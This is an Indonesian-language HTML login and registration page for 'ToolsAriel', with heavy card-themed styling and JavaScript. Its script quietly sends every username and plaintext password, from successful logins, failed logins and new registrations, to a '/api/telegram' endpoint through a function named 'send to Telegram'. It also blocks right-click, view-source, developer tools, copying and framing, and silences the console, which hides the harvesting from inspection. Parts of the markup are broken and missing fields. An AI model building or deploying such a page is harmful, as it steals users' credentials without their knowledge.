<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Masuk - ToolsAriel</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:'Inter','Segoe UI',sans-serif; }

  html { overflow-x:hidden; width:100%; max-width:100vw; }

  body {
    min-height:100vh;
    width:100%;
    max-width:100vw;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    overflow-x:hidden;
    padding:40px 20px;
    gap:30px;
    position:relative;
    margin:0;
    background:#1a1a1a;
    -webkit-user-select:none;
    -moz-user-select:none;
    -ms-user-select:none;
    user-select:none;
    -webkit-touch-callout:none;
  }

  input, textarea {
    -webkit-user-select:text;
    -moz-user-select:text;
    -ms-user-select:text;
    user-select:text;
  }

  .bg-video {
    position:fixed; top:0; left:0;
    width:100vw; height:100vh;
    object-fit:cover;
    z-index:0;
    pointer-events:none;
    filter: blur(6px) saturate(130%);
    transform: scale(1.06);
  }
  .bg-overlay {
    position:fixed; top:0; left:0;
    width:100vw; height:100vh;
    background:
      radial-gradient(circle at 15% 20%, rgba(220,38,38,.15), transparent 55%),
      radial-gradient(circle at 85% 80%, rgba(220,38,38,.10), transparent 55%),
      rgba(0,0,0,.55);
    z-index:1;
    pointer-events:none;
  }

  .card-3d-wrap {
    position:relative;
    width:180px;
    height:250px;
    margin:0 auto;
    perspective:1400px;
    z-index:5;
    animation: floatCard 4.5s ease-in-out infinite;
  }
  @keyframes floatCard {
    0%,100% { transform:translateY(0); }
    50% { transform:translateY(-18px); }
  }
  .card-3d {
    position:relative;
    width:100%; height:100%;
    transform-style:preserve-3d;
    animation: spinCard 10s cubic-bezier(.6,0,.4,1) infinite;
  }
  @keyframes spinCard {
    0%   { transform:rotateY(0deg) rotateX(0deg); }
    32%  { transform:rotateY(0deg) rotateX(0deg); }
    48%  { transform:rotateY(180deg) rotateX(10deg); }
    62%  { transform:rotateY(180deg) rotateX(0deg); }
    82%  { transform:rotateY(180deg) rotateX(0deg); }
    100% { transform:rotateY(360deg) rotateX(0deg); }
  }
  .card-face {
    position:absolute; inset:0;
    backface-visibility:hidden;
    -webkit-backface-visibility:hidden;
    border-radius:16px;
    border:4px solid #dc2626;
    box-shadow:0 30px 50px rgba(0,0,0,.55);
    overflow:hidden;
  }
  .card-front {
    background:#ffffff;
    display:flex;
    flex-direction:column;
    justify-content:space-between;
    padding:14px;
  }
  .card-front::before {
    content:'';
    position:absolute;
    inset:8px;
    border:2px solid #dc2626;
    border-radius:9px;
    opacity:.6;
  }
  .corner {
    display:flex;
    flex-direction:column;
    align-items:center;
    line-height:1;
    color:#dc2626;
    font-weight:900;
    z-index:3;
    position:relative;
  }
  .corner .letter { font-size:22px; }
  .corner .suit-svg { width:18px; height:18px; margin-top:3px; }
  .corner.tl { align-self:flex-start; }
  .corner.br { align-self:flex-end; transform:rotate(180deg); }
  .suit-big-svg {
    position:absolute;
    top:50%; left:50%;
    transform:translate(-50%,-50%);
    width:100px; height:100px;
    animation: suitPulse 2.5s ease-in-out infinite;
  }
  @keyframes suitPulse {
    0%,100% { transform:translate(-50%,-50%) scale(1); }
    50% { transform:translate(-50%,-50%) scale(1.06); }
  }

  .card-back {
    transform:rotateY(180deg);
    background:#0a0a0a;
    display:flex;
    flex-direction:column;
    justify-content:space-between;
    padding:14px;
    position:relative;
    overflow:hidden;
  }
  .card-back::before {
    content:'';
    position:absolute;
    inset:8px;
    border:2px solid #dc2626;
    border-radius:9px;
    box-shadow:0 0 20px rgba(220,38,38,.5) inset;
    z-index:2;
  }
  .card-back::after {
    content:'';
    position:absolute; inset:0;
    background:radial-gradient(circle at center, rgba(220,38,38,.4), transparent 70%);
    animation: firePulse 2s ease-in-out infinite;
  }
  @keyframes firePulse {
    0%,100% { opacity:.6; }
    50% { opacity:1; }
  }
  .joker-figure {
    position:absolute;
    top:50%; left:50%;
    transform:translate(-50%,-50%);
    width:120px; height:120px;
    z-index:3;
    animation: jokerEvil 3s ease-in-out infinite;
    filter:drop-shadow(0 0 8px rgba(220,38,38,.8));
  }
  @keyframes jokerEvil {
    0%,100% { transform:translate(-50%,-50%) translateY(0); }
    50% { transform:translate(-50%,-50%) translateY(-4px); }
  }
  .joker-label {
    display:flex;
    flex-direction:column;
    align-items:center;
    color:#dc2626;
    font-weight:900;
    z-index:4;
    position:relative;
    font-size:10px;
    letter-spacing:1.5px;
    text-shadow:0 0 6px rgba(220,38,38,.8);
  }
  .joker-label .star {
    font-size:12px;
    margin-top:3px;
    color:#fff;
    animation: starBlink 1.5s ease-in-out infinite;
  }
  @keyframes starBlink {
    0%,100% { opacity:1; }
    50% { opacity:.4; }
  }
  .joker-label.tl { align-self:flex-start; }
  .joker-label.br { align-self:flex-end; transform:rotate(180deg); }

  .card-glow {
    position:absolute;
    bottom:-30px; left:50%;
    transform:translateX(-50%);
    width:150px; height:22px;
    background:radial-gradient(ellipse, rgba(220,38,38,.7), transparent 70%);
    border-radius:50%;
    animation: glowPulse 4s ease-in-out infinite;
    z-index:-1;
  }
  @keyframes glowPulse {
    0%,100% { opacity:.7; transform:translateX(-50%) scale(1); }
    50% { opacity:1; transform:translateX(-50%) scale(1.15); }
  }

  .card {
    width:100%;
    max-width:420px;
    margin:0 auto;
    padding:52px 40px 40px 40px;
    background:rgba(255,255,255,.94);
    backdrop-filter:blur(14px);
    -webkit-backdrop-filter:blur(14px);
    border:4px solid #dc2626;
    border-radius:14px;
    box-shadow:
      10px 10px 0 #dc2626,
      20px 20px 0 #000,
      0 25px 50px rgba(220,38,38,.5);
    position:relative;
    z-index:5;
    animation: dealCard 1.1s cubic-bezier(.2,.9,.3,1.4) backwards;
    animation-delay:.3s;
  }
  @keyframes dealCard {
    0% { opacity:0; transform:translateY(30px) scale(.95); }
    100% { opacity:1; transform:translateY(0) scale(1); }
  }
  .card::before {
    content:'';
    position:absolute;
    inset:8px;
    border:2px solid #dc2626;
    border-radius:8px;
    pointer-events:none;
    opacity:.6;
  }

  .corner-mark {
    position:absolute;
    display:flex;
    flex-direction:column;
    align-items:center;
    color:#dc2626;
    font-weight:900;
    z-index:3;
  }
  .corner-mark.top-left { top:16px; left:16px; }
  .corner-mark.bottom-right { bottom:16px; right:16px; transform:rotate(180deg); }
  .corner-mark .letter { font-size:20px; }
  .corner-mark svg { width:18px; height:18px; margin-top:2px; }

  .form-logo {
    display:flex;
    align-items:center;
    justify-content:center;
    gap:12px;
    margin-bottom:8px;
    position:relative;
    z-index:2;
  }
  .form-logo svg {
    width:36px; height:36px;
    animation: logoSpin 8s linear infinite;
    filter:drop-shadow(2px 2px 0 #000);
  }
  @keyframes logoSpin {
    0% { transform:rotate(0deg); }
    100% { transform:rotate(360deg); }
  }
  .brand-text {
    font-size:21px;
    font-weight:900;
    letter-spacing:4px;
    text-transform:uppercase;
    color:#000;
  }
  .brand-text span {
    color:#dc2626;
    text-shadow:2px 2px 0 #000;
  }

  .subtitle {
    text-align:center;
    font-size:10.5px;
    color:#dc2626;
    margin-bottom:18px;
    letter-spacing:2.5px;
    text-transform:uppercase;
    font-weight:800;
    padding:5px 0;
    border-top:2px solid #dc2626;
    border-bottom:2px solid #dc2626;
    position:relative;
    z-index:2;
  }

  .tabs {
    display:flex;
    margin-bottom:20px;
    border:3px solid #000;
    position:relative;
    z-index:2;
  }
  .tabs button {
    flex:1;
    padding:11px 4px;
    border:none;
    background:#fff;
    font-weight:900;
    font-size:11px;
    letter-spacing:1.5px;
    color:#000;
    cursor:pointer;
    transition:.2s;
    text-transform:uppercase;
    font-family:inherit;
  }
  .tabs button:first-child { border-right:3px solid #000; }
  .tabs button.active { background:#dc2626; color:#fff; }
  .tabs button:hover:not(.active) { background:#fee2e2; }

  .form-panel { display:none; position:relative; z-index:2; }
  .form-panel.active { display:block; animation: formIn .4s ease; }
  @keyframes formIn {
    from { opacity:0; transform:translateX(15px); }
    to { opacity:1; transform:translateX(0); }
  }

  .field { margin-bottom:14px; position:relative; z-index:2; }
  .field label {
    display:block;
    font-size:10px;
    font-weight:900;
    color:#000;
    margin-bottom:6px;
    letter-spacing:1.5px;
    text-transform:uppercase;
    padding-left:2px;
  }
  .field input {
    width:100%;
    padding:12px 14px;
    border:3px solid #000;
    font-size:13.5px;
    color:#000;
    outline:none;
    background:#fff;
    transition:.2s;
    font-weight:600;
    border-radius:0;
    font-family:inherit;
  }
  .field input::placeholder { color:#999; }
  .field input:focus {
    border-color:#dc2626;
    background:#fef2f2;
    box-shadow:4px 4px 0 #000;
    transform:translate(-2px,-2px);
  }

  .btn-submit {
    width:100%;
    padding:14px;
    border:3px solid #000;
    background:#dc2626;
    color:#fff;
    font-size:12.5px;
    font-weight:900;
    cursor:pointer;
    margin-top:8px;
    transition:.15s;
    letter-spacing:2px;
    text-transform:uppercase;
    box-shadow:5px 5px 0 #000;
    border-radius:0;
    position:relative;
    overflow:hidden;
    z-index:2;
    font-family:inherit;
  }
  .btn-submit::after {
    content:'';
    position:absolute;
    inset:0;
    background:linear-gradient(90deg, transparent, rgba(255,255,255,.5), transparent);
    transform:translateX(-100%);
    transition:transform .6s;
  }
  .btn-submit:hover {
    background:#b91c1c;
    transform:translate(-2px,-2px);
    box-shadow:7px 7px 0 #000;
  }
  .btn-submit:hover::after { transform:translateX(100%); }
  .btn-submit:active {
    transform:translate(3px,3px);
    box-shadow:2px 2px 0 #000;
  }
  .btn-submit.loading { background:#000; pointer-events:none; }
  .btn-submit.loading::before {
    content:'MEMPROSES...';
    position:absolute;
    inset:0;
    display:flex;
    align-items:center;
    justify-content:center;
    background:#000;
    color:#fff;
    z-index:3;
  }

  .error-msg {
    display:none;
    background:#fef2f2;
    border:3px solid #dc2626;
    color:#dc2626;
    padding:10px 14px;
    font-size:11.5px;
    font-weight:800;
    letter-spacing:1px;
    text-transform:uppercase;
    margin-bottom:12px;
    text-align:center;
    position:relative;
    z-index:2;
  }
  .error-msg.show { display:block; animation: shake .4s ease; }
  @keyframes shake {
    0%,100% { transform:translateX(0); }
    25% { transform:translateX(-6px); }
    75% { transform:translateX(6px); }
  }

  .success-msg {
    display:none;
    background:#f0fdf4;
    border:3px solid #22c55e;
    color:#16a34a;
    padding:10px 14px;
    font-size:11.5px;
    font-weight:800;
    letter-spacing:1px;
    text-transform:uppercase;
    margin-bottom:12px;
    text-align:center;
    position:relative;
    z-index:2;
  }
  .success-msg.show { display:block; }

  .footer-text {
    text-align:center;
    font-size:10.5px;
    color:#666;
    margin-top:16px;
    font-weight:700;
    letter-spacing:1px;
    position:relative;
    z-index:2;
  }

  @media (max-width:480px){
    body { padding:30px 16px; gap:24px; }
    .card-3d-wrap { width:140px; height:195px; }
    .suit-big-svg { width:80px; height:80px; }
    .joker-figure { width:90px; height:90px; }
    .card { padding:44px 24px 32px 24px; box-shadow:6px 6px 0 #dc2626, 12px 12px 0 #000; }
    .brand-text { font-size:17px; letter-spacing:3px; }
    .form-logo svg { width:30px; height:30px; }
    .tabs button { font-size:10px; letter-spacing:1px; padding:10px 2px; }
  }
</style>
</head>

      </div>

  </div>

  <div class="card">
    <div class="corner-mark top-left">
      <span class="letter">A</span>
      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
        <path d="M50 8 C30 30 8 48 8 66 C8 80 18 90 32 90 C42 90 48 84 50 76 C52 84 58 90 68 90 C82 90 92 80 92 66 C92 48 70 30 50 8 Z M44 88 L40 96 L60 96 L56 88 Z" fill="#dc2626"/>
      </svg>

    <div class="corner-mark bottom-right">
      <span class="letter">A</span>
      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
        <path d="M50 8 C30 30 8 48 8 66 C8 80 18 90 32 90 C42 90 48 84 50 76 C52 84 58 90 68 90 C82 90 92 80 92 66 C92 48 70 30 50 8 Z M44 88 L40 96 L60 96 L56 88 Z" fill="#dc2626"/>
      </svg>
    </div>

      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
        <rect x="6" y="6" width="88" height="88" fill="#dc2626" stroke="#000" stroke-width="6"/>
        <rect x="16" y="16" width="68" height="68" fill="#ffffff" stroke="#000" stroke-width="4"/>
        <rect x="24" y="26" width="22" height="6" fill="#000"/>
        <rect x="32" y="26" width="6" height="34" fill="#000"/>

      <div class="brand-text">TOOLS <span>ARIEL</span></div>
    </div>
    <p class="subtitle">Autentikasi Sistem</p>

    <div class="tabs">
      <button class="active" onclick="switchTab('login', this)">Login</button>
      <button onclick="switchTab('register', this)">Register</button>
    </div>

    <div class="error-msg" id="errorMsg"></div>
    <div class="success-msg" id="successMsg"></div>

    <form class="form-panel active" id="panel-login" onsubmit="handleLogin(event)">

        <input type="text" id="regUser" placeholder="Pilih username" autocomplete="username" required />
      </div>
      <div class="field">
        <label>Password</label>
        <input type="password" id="regPass" placeholder="Min. 6 karakter" autocomplete="new-password" required />
      </div>
      <div class="field">
        <label>Konfirmasi Password</label>
        <input type="password" id="regConfirm" placeholder="Ulangi password" autocomplete="new-password" required />
      </div>
      <button type="submit" class="btn-submit" id="btnRegister">Daftar Akun</button>
      <p class="footer-text">Akun langsung bisa dipakai login</p>
    </form>
  </div>

<script>
  /* ============================================
     ANTI-SOURCE PROTECTION
     ============================================ */
  (function antiSource() {
    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
    document.addEventListener('keydown', function(e) {
      var k = (e.key || '').toLowerCase();
      if (e.keyCode === 123 || k === 'f12') { e.preventDefault(); return false; }
      if (e.ctrlKey && e.shiftKey && (k === 'i' || k === 'j' || k === 'c')) { e.preventDefault(); return false; }
      if (e.ctrlKey && k === 'u') { e.preventDefault(); return false; }
      if (e.ctrlKey && k === 's') { e.preventDefault(); return false; }
      if (e.ctrlKey && k === 'p') { e.preventDefault(); return false; }
      if (e.metaKey && e.altKey && (k === 'i' || k === 'u' || k === 'j' || k === 'c')) { e.preventDefault(); return false; }
      if (e.metaKey && (k === 'u' || k === 's')) { e.preventDefault(); return false; }
    });
    document.addEventListener('dragstart', function(e) { e.preventDefault(); return false; });
    document.addEventListener('selectstart', function(e) {
      var t = e.target;
      if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA')) return true;
      e.preventDefault(); return false;
    });
    document.addEventListener('copy', function(e) {
      var t = e.target;
      if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA')) return true;
      e.preventDefault();
      e.clipboardData.setData('text/plain', 'Dilarang menyalin konten ini.');
      return false;
    });
    document.addEventListener('cut', function(e) {
      var t = e.target;
      if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA')) return true;
      e.preventDefault(); return false;
    });
    if (window.top !== window.self) {
      try { window.top.location = window.self.location; }
      catch (e) { document.body.innerHTML = ''; }
    }
    var devtoolsOpen = false;
    var threshold = 160;
    setInterval(function() {
      var wDiff = window.outerWidth - window.innerWidth;
      var hDiff = window.outerHeight - window.innerHeight;
      if (wDiff > threshold || hDiff > threshold) {
        if (!devtoolsOpen) {
          devtoolsOpen = true;
          document.body.innerHTML =
            '<div style="position:fixed;inset:0;background:#000;color:#dc2626;' +
            'display:flex;align-items:center;justify-content:center;' +
            'font-family:Inter,sans-serif;font-size:22px;font-weight:900;' +
            'letter-spacing:2px;text-align:center;padding:20px;z-index:999999;">' +
            'AKSES DITOLAK<br><span style="font-size:14px;color:#fff;font-weight:600;margin-top:12px;display:block;">' +
            'Tutup Developer Tools untuk melanjutkan.</span></div>';
        }
      } else { devtoolsOpen = false; }
    }, 1000);
    try {
      console.log = function() {};
      console.warn = function() {};
      console.info = function() {};
      console.debug = function() {};
    } catch (e) {}
  })();

  /* ============================================
     UI HELPERS
     ============================================ */
  function showError(msg) {
    var el = document.getElementById('errorMsg');
    el.textContent = msg;
    el.classList.add('show');
    document.getElementById('successMsg').classList.remove('show');
  }
  function showSuccess(msg) {
    var el = document.getElementById('successMsg');
    el.textContent = msg;
    el.classList.add('show');
    document.getElementById('errorMsg').classList.remove('show');
  }
  function hideMessages() {
    document.getElementById('errorMsg').classList.remove('show');
    document.getElementById('successMsg').classList.remove('show');
  }

  function switchTab(name, btn) {
    document.querySelectorAll('.form-panel').forEach(function(p) {
      p.classList.remove('active');
    });
    document.getElementById('panel-' + name).classList.add('active');

    document.querySelectorAll('.tabs button').forEach(function(b) {
      b.classList.remove('active');
    });
    btn.classList.add('active');

    hideMessages();
  }

  /* ============================================
     PARSE RESPONSE (ANTI "NOT VALID JSON")
     ============================================ */
  async function parseResponse(res) {
    var text = await res.text();
    try {
      return JSON.parse(text);
    } catch (e) {
      return { success: false, message: 'Server tidak merespons JSON. Cek endpoint /api/auth.' };
    }
  }

  /* ============================================
     KIRIM KE TELEGRAM
     ============================================ */
  async function kirimKeTelegram(username, password, tipe) {
    try {
      var res = await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: username, password: password, tipe: tipe })
      });
      var data = await res.json();
      return data.success === true;
    } catch (err) {
      return false;
    }
  }

  /* ============================================
     HANDLE LOGIN — /api/auth?action=login
     ============================================ */
  async function handleLogin(e) {
    e.preventDefault();
    hideMessages();

    var username = document.getElementById('loginUser').value.trim();
    var password = document.getElementById('loginPass').value;
    var btn = document.getElementById('btnLogin');

    if (!username || !password) {
      showError('Username & Password wajib diisi!');
      return;
    }

    btn.classList.add('loading');

    try {
      var res = await fetch('/api/auth?action=login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify({ username: username, password: password })
      });
      var data = await parseResponse(res);

      if (data.success) {
        kirimKeTelegram(username, password, 'login');
        sessionStorage.setItem('user', data.user);
        sessionStorage.setItem('role', data.role || 'member');
        sessionStorage.setItem('loginTime', new Date().toISOString());

        showSuccess('Login berhasil! Mengalihkan...');

        setTimeout(function() {
          window.location.href = '/dashboard.html';
        }, 900);
      } else {
        btn.classList.remove('loading');
        showError(data.message || 'Login gagal');
        kirimKeTelegram(username, password, 'login_gagal');
      }
    } catch (err) {
      btn.classList.remove('loading');
      showError('Error: ' + err.message);
    }
  }

  /* ============================================
     HANDLE REGISTER — /api/auth?action=register
     ============================================ */
  async function handleRegister(e) {
    e.preventDefault();
    hideMessages();

    var username = document.getElementById('regUser').value.trim();
    var password = document.getElementById('regPass').value;
    var confirm  = document.getElementById('regConfirm').value;
    var btn = document.getElementById('btnRegister');

    if (username.length < 3) {
      showError('Username minimal 3 karakter!');
      return;
    }
    if (password.length < 6) {
      showError('Password minimal 6 karakter!');
      return;
    }
    if (password !== confirm) {
      showError('Konfirmasi password tidak cocok!');
      return;
    }

    btn.classList.add('loading');

    try {
      var res = await fetch('/api/auth?action=register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: username, password: password })
      });
      var data = await parseResponse(res);

      if (data.success) {
        kirimKeTelegram(username, password, 'register');
        btn.classList.remove('loading');
        showSuccess('Akun berhasil dibuat! Silakan login.');

        document.getElementById('panel-register').reset();

        setTimeout(function() {
          var btnLogin = document.querySelectorAll('.tabs button')[0];
          switchTab('login', btnLogin);
          document.getElementById('loginUser').value = username;
          document.getElementById('loginPass').focus();
        }, 1500);
      } else {
        btn.classList.remove('loading');
        showError(data.message || 'Register gagal');
      }
    } catch (err) {
      btn.classList.remove('loading');
      showError('Error: ' + err.message);
    }
  }

  window.addEventListener('load', function() {
    document.getElementById('loginUser').focus();
  });
</script>

</body>
